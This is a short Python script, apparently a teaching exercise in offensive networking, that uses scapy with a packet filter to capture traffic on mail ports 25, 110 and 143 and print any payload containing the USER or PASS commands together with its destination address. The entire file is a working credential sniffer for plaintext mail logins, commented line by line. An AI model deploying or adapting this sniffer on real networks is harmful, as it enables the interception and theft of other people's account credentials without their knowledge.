'''
This script uses a Berkeley Packet Filter to sniff traffic coming in or out on ports 25, 110, or 143
'''

from scapy.all import sniff, TCP, IP

# the packet callback
def packet_callback(packet):        # called on each packet that matches the filter criteria
    if packet[TCP].payload:         # making sure the packet has a payload
        mypacket = str(packet[TCP].payload)     # variablize the captured payload as a string
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():    # if the USER or PASS mail commands are in the captured payload
            print(f'[*] Destination: {packet[IP].dst}')     # if either command is detected, print the destination and the contents
            print(f'[*] {str(packet[TCP].payload)}')

def main():
    # fire up the sniffer and filter for traffic on common mail ports
    sniff(filter=' tcp port 110 or tcp port 25 or tcp port 143', prn=packet_callback, store=0)      # store=0 ensures that captured packets are not kept in memory 

if __name__ == "__main__":
    main()